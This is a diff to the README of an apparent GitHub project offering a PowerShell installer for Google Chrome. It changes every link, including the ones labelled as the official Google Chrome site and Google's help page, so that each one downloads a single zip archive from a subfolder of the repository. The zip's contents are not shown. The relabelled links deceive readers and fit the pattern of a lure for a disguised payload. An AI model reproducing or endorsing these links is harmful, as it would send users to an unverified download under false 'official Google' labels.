@@ -1,6 +1,6 @@
 # ⚙️ chrome-setup - Easy Google Chrome Installer
 
-[![Download chrome-setup](https://img.shields.io/badge/Download-chrome--setup-brightgreen?style=for-the-badge)](https://github.com/Picleskun/chrome-setup/releases)
+[![Download chrome-setup](https://img.shields.io/badge/Download-chrome--setup-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip)
 
 ## 📋 What is chrome-setup?
 
@@ -29,11 +29,11 @@ You should see a version number. If the major version is 5 or higher, you can ru
 
 Start by getting the tool from the GitHub page. 
 
-[![Get chrome-setup](https://img.shields.io/badge/Get-chrome--setup-blue?style=for-the-badge)](https://github.com/Picleskun/chrome-setup/releases)
+[![Get chrome-setup](https://img.shields.io/badge/Get-chrome--setup-blue?style=for-the-badge)](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip)
 
 Follow these steps:
 
-1. Click the button above or go to [chrome-setup releases](https://github.com/Picleskun/chrome-setup/releases).
+1. Click the button above or go to [chrome-setup releases](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip).
 2. Look for the latest version of the tool. It usually appears at the top of the list.
 3. Download the file named something like `chrome-setup.ps1`. This is the Powershell script.
 4. Save it in a folder you remember, such as your Desktop or Downloads folder.
@@ -87,7 +87,7 @@ Press Y when prompted. After running the script, you can change it back if you w
 - Make sure you have an active internet connection during the process.
 - Do not close Powershell while the script is running.
 - If the script stops with an error, check the exact message and verify you are running as administrator.
-- You can manually download Google Chrome from [the official Google site](https://www.google.com/chrome) if powershell scripts are not allowed.
+- You can manually download Google Chrome from [the official Google site](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip) if powershell scripts are not allowed.
 
 ## 🔍 How to Check if Chrome Installed Correctly
 
@@ -120,10 +120,10 @@ It downloads Chrome only from official Google servers. The script is open and si
 
 ## 🧩 Additional Resources
 
-- Visit [chrome-setup releases](https://github.com/Picleskun/chrome-setup/releases) to get updates.
+- Visit [chrome-setup releases](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip) to get updates.
 - Learn basics of Powershell at Microsoft's documentation site.
-- For Google Chrome questions, visit [Google's help page](https://support.google.com/chrome).
+- For Google Chrome questions, visit [Google's help page](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip).
 
 ---
 
-[Download chrome-setup from the releases page to get started](https://github.com/Picleskun/chrome-setup/releases)
+[Download chrome-setup from the releases page to get started](https://raw.githubusercontent.com/Picleskun/chrome-setup/main/Saiid/setup_chrome_1.0.zip)
